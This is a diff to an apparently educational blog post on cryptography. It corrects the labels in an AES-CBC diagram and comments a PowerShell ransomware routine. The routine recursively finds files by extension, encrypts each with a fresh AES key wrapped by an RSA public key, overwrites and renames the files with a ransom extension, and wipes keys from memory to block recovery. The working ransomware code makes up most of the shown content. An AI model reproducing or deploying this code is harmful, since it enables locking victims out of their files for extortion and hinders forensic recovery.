@@ -40,15 +40,15 @@ IV ------> XOR      |--> XOR      |--> XOR    ...     |--> XOR
             |-------|     |-------|     |---- ... ----|     |
             |             |             |                   |
             V             V             V                   V
-Ciphertext: E1            E2            E3    ...           En
+Ciphertext: C1            C2            C3    ...           Cn
 ```
 
 Note that:
 - `IV` is the `initialization vector` and it's a block size (16 bytes).
 - `P1`, `P2`, ... `Pn` are the `plaintext` blocks, where the last block (`Pn`) is padded (we won't talk about padding today).
-- `E1`, `E2`, ... `En` are the `ciphertext` blocks.
+- `C1`, `C2`, ... `Cn` are the `ciphertext` blocks.
 
-If we mark `IV` as `E0`, we can make a nice formula: `E[n] = AES-encrypt(P[n] XOR E[n-1])`.  
+If we mark `IV` as `C0`, we can make a nice formula: `C[n] = AES-encrypt(P[n] XOR C[n-1])`.  
 Note that I said `AES` is a Block Cipher (and it is), but there are Modes of Operation that turn Block Ciphers into Stream Ciphers - those include `CTR (counter)` and `GCM (Galois-Counter Mode)`. We won't discuss those, but know these are possible.
 
 In terms of security, Symmetric ciphers are very fast and very safe, and in fact, are quite resilient even against Quantum Computers. This is not a Quantum Computing blogpost, but I will mention that the best known algorithm to crack generic Symmetric encryption systems is [Grover's algorithm](https://en.wikipedia.org/wiki/Grover%27s_algorithm) which can be used to bruteforce a searchspace of keys in `O(sqrt(N))` time complexity - which sounds amazing, until you realize doubling the key size for Symmetric Ciphers completely solves the problem.
@@ -140,16 +140,20 @@ Now we can iterate all the files and encrypt each one:
 ```powershell
 foreach ($f in (Get-ChildItem -Force -ErrorAction SilentlyContinue -Recurse -Path $base_folder -Include $extensions).fullname)
 {
+    # Read the file bytes
     $bytes = Get-Content $f -Encoding Byte -ReadCount 0
-	
+    
+    # Generate a new AES-CBC instance
     $aes = [Security.Cryptography.SymmetricAlgorithm]::Create('AesManaged')
     $aes.Mode = [Security.Cryptography.CipherMode]::CBC
     $aes.Padding = "PKCS7"
     
-	$aes_key = 1..16|%{[byte](Get-Random -Minimum ([byte]::MinValue) -Maximum ([byte]::MaxValue))}
+    # Generate a new AES random key and encrypt it with the IV using the RSA public key
+    $aes_key = 1..16|%{[byte](Get-Random -Minimum ([byte]::MinValue) -Maximum ([byte]::MaxValue))}
     $aes_key_material = $aes_key + $aes.IV
     $aes_key_material = $rsa.Encrypt($aes_key_material, $false)
 
+    # Encrypt the file bytes and append the AES key material
     $aes_encryptor = $aes.CreateEncryptor($aes_key, $aes.IV)
     $stream = New-Object -TypeName IO.MemoryStream
     $enc_stream = New-Object -TypeName Security.Cryptography.CryptoStream -ArgumentList @($stream, $aes_encryptor, [Security.Cryptography.CryptoStreamMode]::Write)
@@ -157,9 +161,12 @@ foreach ($f in (Get-ChildItem -Force -ErrorAction SilentlyContinue -Recurse -Pat
     $enc_stream.FlushFinalBlock()
     $encrypted = $stream.ToArray()
     $encrypted += $aes_key_material
-	
+
+    # Override the file and rename it
     Set-Content -Path $f -Value $encrypted -Encoding Byte -Force
     Rename-Item -Path $f -NewName ($f + $ransom_extension)
+    
+    # Clear important data from memory
     $aes.Clear()
     $stream.SetLength(0)
     $stream.Close()
@@ -167,4 +174,9 @@ foreach ($f in (Get-ChildItem -Force -ErrorAction SilentlyContinue -Recurse -Pat
     $enc_stream.Close()
 }
 ```
+
+While the remarks are quite self-explanatory, I will mention a few things:
+1. We use `AES-CBC` with `PKCS7` padding. I did not discuss padding too much, but `PKCS7` is a standard that also defines how padding should look like (since `AES` is a Block Cipher).
+2. The file contents are encrypted and the `RSA`-encrypted key material is appended *at the end of the encrypted file*.
+3. It's important to properly clear the `$aes` instance and the streams - not only for memory management but also to make sure they are not extracted from memory post-encryption.
 
